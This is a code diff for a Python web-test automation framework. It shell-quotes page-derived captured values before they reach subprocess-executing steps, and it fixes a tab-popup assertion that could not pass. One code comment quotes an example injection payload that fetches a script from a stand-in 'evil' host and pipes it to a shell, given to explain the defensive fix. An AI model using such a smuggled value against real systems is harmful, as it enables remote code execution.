@@ -1,12 +1,18 @@
 import json
 import os
 import re
+import shlex
 
 from noodle import app_lifecycle
 from noodle.agents.web import actions
 from noodle.log import logger
 from noodle.orchestrator import script_runner
-from noodle.resolver.step_resolver import resolve
+from noodle.resolver.step_resolver import LLM_FORBIDDEN_TYPES, resolve
+
+# NOOD_0177 — action types whose params reach a shell or the Python importer.
+# Their step text is re-resolved from the PRE-substitution source with captured
+# values shell-quoted (see execute_step).
+_EXEC_TYPES = LLM_FORBIDDEN_TYPES | {'app_launch'}
 
 
 class SoftAssertionReport(AssertionError):
@@ -60,7 +66,7 @@ def _warn_deprecated(old: str, new: str) -> None:
     logger.warning(f"\n  ⚠️  Deprecated syntax {old} — use {new} instead")
 
 
-def substitute(text: str, extra: dict | None = None) -> str:
+def substitute(text: str, extra: dict | None = None, quote_captured: bool = False) -> str:
     """Expand parameter references (NOOD_0033 unified syntax):
 
       {env:name}  → config: real OS env → .env → secrets.env →
@@ -80,33 +86,45 @@ def substitute(text: str, extra: dict | None = None) -> str:
     def _key(raw: str) -> str:
         return raw.strip().upper().replace(" ", "_")
 
-    def env_lookup(key: str) -> str | None:
-        if key in extra:
-            return extra[key]
-        return os.getenv(key)
+    # NOOD_0177 — quote_captured shell-escapes values that came from the CAPTURED
+    # store (store/extract/function results), which is page-derived text on a web
+    # run. execute_step sets it for run_command/run_script/app_launch, where an
+    # unquoted expansion meant a site returning "x$(curl evil|sh)" in a stored
+    # element reached subprocess.run(shell=True) verbatim. Config from os.environ
+    # is workspace-owned and left alone, so URLs and flags keep working.
+    def _q(val: str, from_capture: bool) -> str:
+        return shlex.quote(val) if (quote_captured and from_capture) else val
+
+    def env_lookup(key: str) -> tuple[str | None, bool]:
+        if key in extra:                   # captured-store fallback
+            return extra[key], True
+        return os.getenv(key), False
 
     def unified(m):
         source, name = m.group(1), m.group(2)
         key = _key(name)
-        val = extra.get(key) if source == 'var' else env_lookup(key)
-        return m.group(0) if val is None else val
+        if source == 'var':
+            val, captured = extra.get(key), True
+        else:
+            val, captured = env_lookup(key)
+        return m.group(0) if val is None else _q(val, captured)
     text = re.sub(r'\{(env|var):([^}]+)\}', unified, text)
 
     def backtick(m):                       # legacy — captured values only
         key = _key(m.group(1))
         if key in extra:
             _warn_deprecated(f"`{m.group(1)}`", f"{{var:{m.group(1)}}}")
-            return extra[key]
+            return _q(extra[key], True)
         return m.group(0)
     text = re.sub(r'`([^`]+)`', backtick, text)
 
     def bracket(m):                        # legacy — .env / config
         key = _key(m.group(1))
-        val = env_lookup(key)
+        val, captured = env_lookup(key)     # NOOD_0177 — now (value, from_capture)
         if val is None:
             return m.group(0)
         _warn_deprecated(f"[{m.group(1)}]", f"{{env:{m.group(1)}}}")
-        return val
+        return _q(val, captured)
     return re.sub(r'\[([^\]]+)\]', bracket, text)
 
 
@@ -173,13 +191,31 @@ def _switch_tab(context, target, assert_opened=False):
     """Point context.page at another open tab. ponytail: previous/first/main all
     mean pages[0] — a real back-stack only matters past 2 tabs, add then."""
     if assert_opened:
+        # NOOD_0177 — check for a tab that is ALREADY open before waiting.
+        # This used to go straight to page.wait_for_event("popup"), on the
+        # stated assumption that it "retrieves the queued popup event even if
+        # the click already fired". It does not: wait_for_event registers a
+        # listener and resolves on the NEXT occurrence. `a new tab should open`
+        # is always its own step, so the popup fired during the preceding
+        # `User clicks "Preview"` and was long gone — the assertion burned the
+        # full timeout and failed every time. The step could never pass.
+        #
+        # `_tabs_acked` is how many tabs this scenario has already accounted
+        # for, so a scenario that legitimately has two tabs open can still
+        # assert that a THIRD one opened — a bare len(pages) > 1 could not.
+        acked = ctx_get(context, "_tabs_acked", 1) or 1
+        pages = _pages(context)
+        if len(pages) > acked:
+            context._tabs_acked = len(pages)
+            _focus(context, pages[-1])
+            return
+        # Not open yet — the click may still be in flight, so waiting is right.
         page = context.page
         timeout_ms = int(os.getenv("NOODLE_TIMEOUT", "10000"))
         from playwright._impl._errors import TimeoutError as _PWTimeout
         try:
-            # wait_for_event("popup") retrieves the queued popup event even if
-            # the click already fired — no need to wrap the click.
             new_page = page.wait_for_event("popup", timeout=timeout_ms)
+            context._tabs_acked = len(_pages(context))
             _focus(context, new_page)
             return
         except _PWTimeout:
@@ -192,6 +228,9 @@ def _close_tab(context):
     if len(_pages(context)) > 1:
         context.page.close()
         _focus(context, _pages(context)[0])
+    # NOOD_0177 — keep the acknowledged count in step with reality, so the next
+    # tab a scenario opens still registers as new.
+    context._tabs_acked = max(1, len(_pages(context)))
 
 
 # Action types that never touch the page — legal in browser-less @api scenarios.
@@ -431,6 +470,7 @@ def _oauth2_fetch(context, url: str, client_id: str, client_secret: str):
 def execute_step(step_text: str, context):
     if ctx_get(context, "_vars", None) is None:
         context._vars = {}
+    raw_step_text = step_text          # NOOD_0177 — kept for the exec re-resolve
     step_text = substitute(step_text, context._vars)
     # NOOD_0153 — evidence bookkeeping. The match-seq snapshot lets
     # hooks.after_step tell whether THIS step resolved an element (draw the
@@ -467,6 +507,19 @@ def execute_step(step_text: str, context):
     page = context.page
 
     t = action['type']
+
+    # NOOD_0177 — substitution above runs BEFORE parsing, so by now a captured
+    # value is indistinguishable from text the author typed. For the types that
+    # execute, redo it from the original sentence with captured values
+    # shell-quoted, so a stored page string can only ever be one argument.
+    if t in _EXEC_TYPES:
+        safe = substitute(raw_step_text, context._vars, quote_captured=True)
+        safe = EVIDENCE_MARKER_RE.sub("", safe)
+        safe = re.sub(r'\s+in the (?:new|last) (?:tab|window)$', '', safe,
+                      flags=re.IGNORECASE)
+        action = resolve(safe, tags=set(
+            getattr(scenario, "effective_tags", None) or []))
+        t = action['type']
 
     # Phase F — @appium scenarios route supported steps to the mobile agent.
     if ctx_get(context, "_mobile") is not None and t in _MOBILE_TYPES:
